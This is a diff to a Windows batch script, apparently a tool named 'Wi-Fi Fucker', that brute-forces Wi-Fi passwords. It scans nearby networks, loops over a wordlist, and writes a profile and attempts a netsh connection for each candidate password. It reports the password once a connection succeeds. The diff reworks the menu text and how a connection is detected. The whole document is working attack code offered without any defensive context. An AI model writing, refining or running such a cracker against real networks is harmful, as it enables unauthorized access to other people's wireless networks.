@@ -57,7 +57,7 @@ echo    ====================================
 echo                   HELP
 echo    ====================================
 echo.
-echo    Dependencies: Powershell, at least Windows 10, english system
+echo    Dependencies: Powershell, at least Windows 10
 echo.
 echo    [INFO] Press any key to return to the menu.
 pause >nul
@@ -86,7 +86,7 @@ echo       -h for help or -r to refresh
 echo    ===================================
 echo.
 
-netsh wlan show interfaces | findstr /R /C:"^ *Name" /C:"^ *Description" /C:"^ *Physical address" /C:"^ *Interface Type" /C:"^ *Signal" /C:"^ *Band"
+netsh wlan show interfaces
 if errorlevel 1 (
     echo.
     echo    [ERROR] No Wi-Fi adapter detected or an Ethernet connection is being used.
@@ -95,7 +95,6 @@ if errorlevel 1 (
     exit /b
 )
 
-echo.
 set /p interface="Enter interface name: "
 if /i "%interface%"=="-r" goto show_interface
 if not defined interface (
@@ -115,18 +114,15 @@ if exist "%bannerpath%" (
 )
 echo    ==================================================
 echo             Available Wi-Fi Networks Nearby:
-echo              Scan Time: %date% %time:~0,8%
-echo       -h for help or -r to refresh or -b to return
 echo    ==================================================
+echo.
 netsh wlan show networks interface="%interface%"
-if %errorlevel% neq 0 (
-    echo    [ERROR] This Problem may be caused because no Wi-Fi adapter was detected or you are using an Ethernet connection.
-    echo    Press any key to return to the menu.
+if errorlevel 1 (
+    echo    [ERROR] No networks found or an Ethernet connection is being used.
+    echo    [INFO] Press any key to exit.
     pause >nul
-    goto start
+    exit /b
 )
-
-goto enter_SSID
 
 :enter_SSID
 set /p SSID="Enter the SSID of the Network: "
@@ -194,7 +190,7 @@ echo.
 
 set /p checkTable="Do you want to edit these values (Y/N): "
 if /i "%checkTable%"=="Y" goto edit
-if /i "%checkTable%"=="N" goto initalizing
+if /i "%checkTable%"=="N" goto create_xml
 echo.
 echo    [Invalid input] Please enter "Y" to continue or "N" to edit.
 echo    [INFO] Press any key to try again.
@@ -232,8 +228,7 @@ set /p new_conType="Connection Type to use (current: %conType%): "
 if not "%new_conType%"=="" set "conType=%new_conType%"
 goto check
 
-:initalizing
-netsh wlan disconnect >nul
+:create_xml
 set "batch=0"
 set "SSID_with_space="
 set "SSID_escaped="
@@ -259,9 +254,6 @@ if not exist "%WordlistPath%" (
     goto show_networks
 )
 
-echo.
-echo    [INFO] Processing the wordlist (bigger files need longer)...
-
 for /f "delims=" %%A in ('type "%WordlistPath%"') do set "check_line=%%A"
 if "%check_line%"=="" (
     echo    [ERROR] The wordlist is empty or invalid.
@@ -269,9 +261,10 @@ if "%check_line%"=="" (
     pause >nul
     goto show_networks
 )
-goto create_xml
 
-:create_xml
+echo.
+echo    [INFO] Processing the wordlist...
+ping 127.0.0.1 -n 2 > nul
 cls
 if exist "%bannerpath%" (
     type "%bannerpath%"
@@ -312,7 +305,6 @@ if %lineLength% gtr 63 (
 )
 set /a batch=batch+1
 
-echo.
 echo    [Attack] Attempt number %batch% with Password %line%
 
 set "line=%line:&=&amp;%"
@@ -361,55 +353,18 @@ set "SSID_escaped=%SSID_escaped:"=&quot;%"
 
 netsh wlan add profile filename="profiles\%batch%.xml" user=current interface="%interface%" >nul
 
-setlocal
-
 netsh wlan connect name="%SSID%" >nul
-goto check_connection
+ping 127.0.0.1 -n 7 >nul
 
-:check_connection
-set "ConnectionState="
-set /a AssociatingCount=1
-
-:check_loop
-for /f "tokens=2 delims=:" %%A in ('netsh wlan show interfaces 2^>^&1 ^| findstr /i "State"') do (
-    set "ConnectionState=%%A"
-)
-if not defined ConnectionState (
-    echo [ERROR] Unable to detect connection state. Retrying...
-    timeout /t 1 >nul
-    goto check_loop
-)
-
-set "ConnectionState=%ConnectionState:~1%"
-
-if /i "%ConnectionState%"=="connected" (
+for /f "tokens=*" %%i in ('netsh wlan show interfaces ^| findstr /i "%SSID%"') do (
+    set "line=%%i"
     echo.
     echo    --- Password: %line% ---
     echo.
     goto return
-) else if /i "%ConnectionState%"=="disconnected" (
-    goto delete
-) else if /i "%ConnectionState%"=="disconnecting" (
-    timeout /t 1 >nul
-    goto check_loop
-) else if /i "%ConnectionState%"=="associating" (
-    set /a AssociatingCount+=1
-    if %AssociatingCount% gtr 2 (
-        goto delete
-    )
-    timeout /t 1 >nul
-    goto check_loop
-) else if /i "%ConnectionState%"=="authenticating" (
-    timeout /t 1 >nul
-    goto check_loop
-) else if /i "%ConnectionState%"=="searching" (
-    timeout /t 1 >nul
-    goto check_loop
-) else (
-    echo [ERROR] Unknown status detected: %ConnectionState%. Retrying...
-    timeout /t 1 >nul
-    goto check_loop
 )
+netsh wlan disconnect
+goto :eof
 
 :return
 set /p option="Do you want to leave Wi-Fi Fucker (l) or return to the main menu (m): "
